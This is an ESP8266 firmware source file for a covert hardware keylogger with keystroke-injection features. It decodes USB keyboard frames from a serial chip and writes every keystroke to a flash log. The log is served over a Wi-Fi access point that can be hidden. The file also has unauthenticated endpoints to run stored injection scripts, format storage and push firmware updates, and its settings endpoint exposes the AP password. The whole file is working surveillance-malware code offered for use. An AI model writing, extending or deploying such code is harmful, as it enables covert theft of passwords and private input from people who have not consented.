#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>
#include <WiFiClient.h>
#include <AsyncElegantOTA.h>
#include "Settings.h"
#include "data.h"

#define BAUD_RATE 115200
#define bufferSize 600
#define debug false

Settings settings;

bool shouldReboot = false;
bool key_debug = false;

// Web stuff
extern const uint8_t data_indexHTML[] PROGMEM;
extern const uint8_t data_updateHTML[] PROGMEM;
extern const uint8_t data_error404[] PROGMEM;
extern const uint8_t data_styleCSS[] PROGMEM;
extern const uint8_t data_functionsJS[] PROGMEM;
extern const uint8_t data_liveHTML[] PROGMEM;
extern const uint8_t data_infoHTML[] PROGMEM;
extern const uint8_t data_license[] PROGMEM;
extern const uint8_t data_settingsHTML[] PROGMEM;
extern const uint8_t data_viewHTML[] PROGMEM;
extern const uint8_t data_keylogHTML[] PROGMEM;
extern const uint8_t data_skeletonCSS[] PROGMEM;
extern const uint8_t data_nomalizeCSS[] PROGMEM;

extern String formatBytes(size_t bytes);

AsyncWebServer server(80);

// Script stuff
bool runLine = false;
bool runScript = false;
File script;

uint8_t scriptBuffer[bufferSize];
uint8_t scriptLineBuffer[bufferSize];
int bc = 0; // buffer counter
int lc = 0; // line buffer counter

FSInfo fs_info;
File f;

String getKey(int serialData)
{
  switch (serialData)
  {
  case 0x00:
    return "[]";
  case 0x04:
    return "A";
  case 0x05:
    return "B";
  case 0x06:
    return "C";
  case 0x07:
    return "D";
  case 0x08:
    return "E";
  case 0x09:
    return "F";
  case 0x0A:
    return "G";
  case 0x0B:
    return "H";
  case 0x0C:
    return "I";
  case 0x0D:
    return "J";
  case 0x0E:
    return "K";
  case 0x0F:
    return "L";
  case 0x10:
    return "M";
  case 0x11:
    return "N";
  case 0x12:
    return "O";
  case 0x13:
    return "P";
  case 0x14:
    return "Q";
  case 0x15:
    return "R";
  case 0x16:
    return "S";
  case 0x17:
    return "T";
  case 0x18:
    return "U";
  case 0x19:
    return "V";
  case 0x1A:
    return "W";
  case 0x1B:
    return "X";
  case 0x1C:
    return "Y";
  case 0x1D:
    return "Z";
  case 0x1E:
    return "[1 or !]";
  case 0x1F:
    return "[2 or @]";
  case 0x20:
    return "[3 or #]";
  case 0x21:
    return "[4 or $]";
  case 0x22:
    return "[5 or %]";
  case 0x23:
    return "[6 or ^]";
  case 0x24:
    return "[7 or &]";
  case 0x25:
    return "[8 or *]";
  case 0x26:
    return "[9 or (]";
  case 0x27:
    return "[10 or )]";
  case 0x28:
    return "[ENTER]";
  case 0x29:
    return "[ESC]";
  case 0x2A:
    return "[BACKSPACE]";
  case 0x2B:
    return "[TAB]";
  case 0x2C:
    return "[SPACE]";
  case 0x2D:
    return "[- or _]";
  case 0x2E:
    return "[= or +]";
  case 0x2F:
    return "[[ or {]";
  case 0x30:
    return "[] or }]";
  case 0x31:
    return "[\\ or |]";
  case 0x32:
    return "[` or ~]";
  case 0x33:
    return "[; or :]";
  case 0x34:
    return "[' or ”]";
  case 0x35:
    return "[~ or `]";
  case 0x36:
    return "[, or <]";
  case 0x37:
    return "[. or >]";
  case 0x38:
    return "[/ or ?]";
  case 0x39:
    return "[CAPS]";
  case 0x3A:
    return "[F1]";
  case 0x3B:
    return "[F2]";
  case 0x3C:
    return "[F3]";
  case 0x3D:
    return "[F4]";
  case 0x3E:
    return "[F5]";
  case 0x3F:
    return "[F6]";
  case 0x40:
    return "[F7]";
  case 0x41:
    return "[F8]";
  case 0x42:
    return "[F9]";
  case 0x43:
    return "[F10]";
  case 0x44:
    return "[F11]";
  case 0x45:
    return "[F12]";
  case 0x46:
    return "[PRT_SCR]";
  case 0x47:
    return "[SCOLL_LOCK]";
  case 0x48:
    return "[PAUSE]";
  case 0x49:
    return "[INS]";
  case 0x4A:
    return "[HOME]";
  case 0x4B:
    return "[PAGEUP]";
  case 0x4C:
    return "[DEL]";
  case 0x4D:
    return "[END]";
  case 0x4E:
    return "[PAGEDOWN]";
  case 0x4F:
    return "[RIGHT_ARROW]";
  case 0x50:
    return "[LEFT_ARROW]";
  case 0x51:
    return "[DOWN_ARROW]";
  case 0x52:
    return "[UP_ARROW]";
  case 0x53:
    return "[PAD_NUMLOCK]";
  case 0x54:
    return "[PAD_DIV]";
  case 0x55:
    return "[PAD_MUL]";
  case 0x56:
    return "[PAD_SUB]";
  case 0x57:
    return "[PAD_ADD]";
  case 0x58:
    return "[PAD_ENTER]";
  case 0x59:
    return "[PAD_1]";
  case 0x5A:
    return "[PAD_2]";
  case 0x5B:
    return "[PAD_3]";
  case 0x5C:
    return "[PAD_4]";
  case 0x5D:
    return "[PAD_5]";
  case 0x5E:
    return "[PAD_6]";
  case 0x5F:
    return "[PAD_7]";
  case 0x60:
    return "[PAD_8]";
  case 0x61:
    return "[PAD_9]";
  case 0x62:
    return "[PAD_0]";
  case 0x63:
    return "[PAD_DOT]";
  case 0xE0:
    return "[leftctrl]";
  case 0xE2:
    return "[leftAlt]";
  case 0xE1:
    return "[leftShift]";
  case 0xE3:
    return "[leftwindows]";
  case 0xE7:
    return "[rightwindows]";
  case 0xE5:
    return "[rightShift]";
  case 0xE6:
    return "[rightAlt]";
  case 0xE4:
    return "[rightCtrl]";

  default:
    return "[NONE]";
  }
}

void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final)
{
  File f2;

  if (!filename.startsWith("/"))
    filename = "/" + filename;

  if (!index)
    f2 = SPIFFS.open(filename, "w"); // create or trunicate file
  else
    f2 = SPIFFS.open(filename, "a"); // append to file (for chunked upload)

  if (debug)
    Serial.write(data, len);
  f2.write(data, len);

  if (final)
  { // upload finished
    if (debug)
      Serial.printf("UploadEnd: %s, %u B\n", filename.c_str(), index + len);
    f2.close();
  }
}

void send404(AsyncWebServerRequest *request)
{
  AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_error404, sizeof(data_error404));
  request->send(response);
}

void sendToIndex(AsyncWebServerRequest *request)
{
  AsyncWebServerResponse *response = request->beginResponse(302, "text/plain", "");
  response->addHeader("Location", "/");
  request->send(response);
}

void sendSettings(AsyncWebServerRequest *request)
{
  AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_settingsHTML, sizeof(data_settingsHTML));
  request->send(response);
}

void sendBuffer()
{
  for (int i = 0; i < bc; i++)
    Serial.write((char)scriptBuffer[i]);
  runLine = false;
  bc = 0;
}

void addToBuffer()
{
  if (bc + lc > bufferSize)
    sendBuffer();
  for (int i = 0; i < lc; i++)
  {
    scriptBuffer[bc] = scriptLineBuffer[i];
    bc++;
  }
  lc = 0;
}

void setup()
{
  Serial.begin(BAUD_RATE);

  EEPROM.begin(4096);
  SPIFFS.begin();

  settings.load();
  settings.print();

  WiFi.mode(WIFI_STA);
  WiFi.softAP(settings.ssid, settings.password, settings.channel, settings.hidden);

  f = SPIFFS.open("/keystrokes.txt", "a+");
  f.println("Log File creating a successful! \r\n");

  /*
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
              {
      AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_keylogHTML, sizeof(data_keylogHTML));
      request->send(response); });
  */

  server.on("/log", HTTP_GET, [](AsyncWebServerRequest *request)
            { request->send(SPIFFS, "/keystrokes.txt", "text/plain"); });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    f.close();
    f = SPIFFS.open("/keystrokes.txt", "w");
    f.println("Log File Cleared! \r\n");
    f.println("Log File creating a successful! \r\n");
    request->send(200, "text/plain", "Log File Cleared!"); });

  server.on("/list.json", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    SPIFFS.info(fs_info);
    Dir dir = SPIFFS.openDir("");
    String output;
    output += "{";
    output += "\"totalBytes\":" + (String)fs_info.totalBytes + ",";
    output += "\"usedBytes\":" + (String)fs_info.usedBytes + ",";
    output += "\"list\":[ ";
    while(dir.next()) {
      File entry = dir.openFile("r");
      String filename = String(entry.name()).substring(1);
      output += '{';
      output += "\"n\":\"" + filename + "\",";//name
      output += "\"s\":\"" + formatBytes(entry.size()) + "\"";//size
      output += "},";
      entry.close();
    }
    output = output.substring(0, output.length() - 1);
    output += "]}";
    request->send(200, "text/json", output); });

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_keylogHTML, sizeof(data_keylogHTML));
    request->send(response); });

  // Duck shit
  server.on("/index.html", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_indexHTML, sizeof(data_indexHTML));
    request->send(response); });

  server.on("/license.txt", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/plain", data_license, sizeof(data_license));
    request->send(response); });

  server.on("/live.html", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_liveHTML, sizeof(data_liveHTML));
    request->send(response); });

  server.on("/view.html", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_viewHTML, sizeof(data_viewHTML));
    request->send(response); });

  server.on("/license", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/plain", data_license, sizeof(data_license));
    request->send(response); });

  server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/css", data_styleCSS, sizeof(data_styleCSS));
    request->send(response); });

  server.on("/normalize.css", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/css", data_nomalizeCSS, sizeof(data_nomalizeCSS));
    request->send(response); });

  server.on("/skeleton.css", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/css", data_skeletonCSS, sizeof(data_skeletonCSS));
    request->send(response); });

  server.on("/functions.js", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/javascript", data_functionsJS, sizeof(data_functionsJS));
    request->send(response); });

  server.on("/info.html", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_infoHTML, sizeof(data_infoHTML));
    request->send(response); });

  server.on("/settings.html", HTTP_GET, [](AsyncWebServerRequest *request)
            { sendSettings(request); });

  server.on("/settings.html", HTTP_POST, [](AsyncWebServerRequest *request)
            {

    if(request->hasArg("ssid")) {
      String _ssid = request->arg("ssid");
      settings.ssidLen = _ssid.length();
      _ssid.toCharArray(settings.ssid, 32);
      if(debug) Serial.println("new SSID = '"+_ssid+"'");
    }
    if(request->hasArg("pswd")) {
      String _pswd = request->arg("pswd");
      settings.passwordLen = _pswd.length();
      _pswd.toCharArray(settings.password, 32);
      if(debug) Serial.println("new password = '" + _pswd + "'");
    }
    if(request->hasArg("autostart")) {
      String _autostart = request->arg("autostart");
      settings.autostartLen = _autostart.length();
      _autostart.toCharArray(settings.autostart, 32);
      if(debug) Serial.println("new autostart = '" + _autostart + "'");
    }
    if(request->hasArg("ch")) settings.channel = request->arg("ch").toInt();
    if(request->hasArg("hidden")) settings.hidden = true;
    else settings.hidden = false;
    if(request->hasArg("autoExec")) settings.autoExec = true;
    else settings.autoExec = false;

    settings.save();
    if(debug) settings.print();

    sendSettings(request); });

  server.on("/settings.json", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    String output = "{";
    output += "\"ssid\":\"" + (String)settings.ssid + "\",";
    output += "\"password\":\"" + (String)settings.password + "\",";
    output += "\"channel\":" + String((int)settings.channel) + ",";
    output += "\"hidden\":" + String((int)settings.hidden) + ",";
    output += "\"autoExec\":" + String((int)settings.autoExec) + ",";
    output += "\"autostart\":\"" + (String)settings.autostart + "\"";
    output += "}";
    request->send(200, "text/json", output); });

  server.on("/list.json", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    SPIFFS.info(fs_info);
    Dir dir = SPIFFS.openDir("");
    String output;
    output += "{";
    output += "\"totalBytes\":" + (String)fs_info.totalBytes + ",";
    output += "\"usedBytes\":" + (String)fs_info.usedBytes + ",";
    output += "\"list\":[ ";
    while(dir.next()) {
      File entry = dir.openFile("r");
      String filename = String(entry.name()).substring(1);
      output += '{';
      output += "\"n\":\"" + filename + "\",";//name
      output += "\"s\":\"" + formatBytes(entry.size()) + "\"";//size
      output += "},";
      entry.close();
    }
    output = output.substring(0, output.length() - 1);
    output += "]}";
    request->send(200, "text/json", output); });

  server.on("/script", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    if(request->hasArg("name")){
      String _name = request->arg("name");
      request->send(SPIFFS, "/"+_name, "text/plain");
    }else send404(request); });

  server.on("/run", HTTP_POST, [](AsyncWebServerRequest *request)
            {
    if(request->hasArg("name")) {
      String _name = request->arg("name");
      script = SPIFFS.open("/" + _name, "r");
      runScript = true;
      runLine = true;
      request->send(200, "text/plain", "true");
    }
    else if(request->hasArg("script")) {
      Serial.println(request->arg("script"));
      request->send(200, "text/plain", "true");
    }
    else send404(request); });

  server.on("/save", HTTP_POST, [](AsyncWebServerRequest *request)
            {
    if(request->hasArg("name") && request->hasArg("script")) {
      String _name = request->arg("name");
      String _script = request->arg("script");
      File f = SPIFFS.open("/" + _name, "w");
      if(f) {
        f.print(_script);
        request->send(200, "text/plain", "true");
      }
      else request->send(200, "text/plain", "false");
    }
    else send404(request); });

  server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    if(request->hasArg("name")){
      String _name = request->arg("name");
      SPIFFS.remove("/"+_name);
      request->send(200, "text/plain", "true");
    }else send404(request); });

  server.on("/rename", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    if(request->hasArg("name") && request->hasArg("newName")) {
      String _name = request->arg("name");
      String _newName = request->arg("newName");
      SPIFFS.rename("/" + _name, "/" + _newName);
      request->send(200, "text/plain", "true");
    }
    else send404(request); });

  server.on("/format", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    SPIFFS.format();
    request->send(200, "text/plain", "true");
    sendToIndex(request); });

  server.on(
      "/upload", HTTP_POST, [](AsyncWebServerRequest *request)
      { sendToIndex(request); },
      handleUpload);

  server.onNotFound([](AsyncWebServerRequest *request)
                    { send404(request); });

  server.on("/restart", HTTP_GET, [](AsyncWebServerRequest *request)
            { shouldReboot = true; });

  server.on("/keydebug", HTTP_GET, [](AsyncWebServerRequest *request)
            { 
    key_debug = true; 
    request->send(200, "text/plain", "Key_debug enabled!"); });

  AsyncElegantOTA.begin(&server);

  server.begin();
}

void loop()
{
  if (shouldReboot)
    ESP.restart();

  AsyncElegantOTA.loop();

  while (Serial.available() > 0)
  {
    // 57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
    int sRead;
    if (Serial.read() == 0x83)
    {
      delay(10);
      if (Serial.read() == 0x0C)
      {
        delay(10);
        if (Serial.read() == 0x12)
        {
          delay(10);
          if (Serial.read() == 0x01)
          {
            delay(10);
            if (Serial.read() == 0x02) // shift
            {
              delay(10);
              Serial.read();
              delay(10);
              sRead = Serial.read();
              if (sRead == 0x00) // second frame
                break;
              f.print("SHIFT+");
              f.print(getKey(sRead));
              f.print(" ");
              break;
            }
            delay(10);
            Serial.read();
            delay(10);
            sRead = Serial.read();
            if (sRead != 0x00) // second frame
            {
              if (!key_debug)
              {
                f.print(getKey(sRead));
                f.print(" ");
                // logFile.println();
              }
              else
              {
                f.print("key_debug[");
                f.print(String(sRead));
                f.print("]");
                f.print(" ");
              }
            }
          }
        }
      }
    }
  }

  /*
    while (Serial.available() > 0)
    {
      // 57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
      f.print("[" + String(Serial.read()) + "]  ");
    }
  */

  /*
    if (runScript && runLine)
    {
      if (script.available())
      {
        uint8_t nextChar = script.read();
        if (debug)
          Serial.write(nextChar);
        scriptLineBuffer[lc] = nextChar;
        lc++;
        if (nextChar == 0x0D || lc == bufferSize)
          addToBuffer();
      }
      else
      {
        addToBuffer();
        if (bc > 0)
          sendBuffer();
        runScript = false;
        script.close();
      }
    }
  */
}
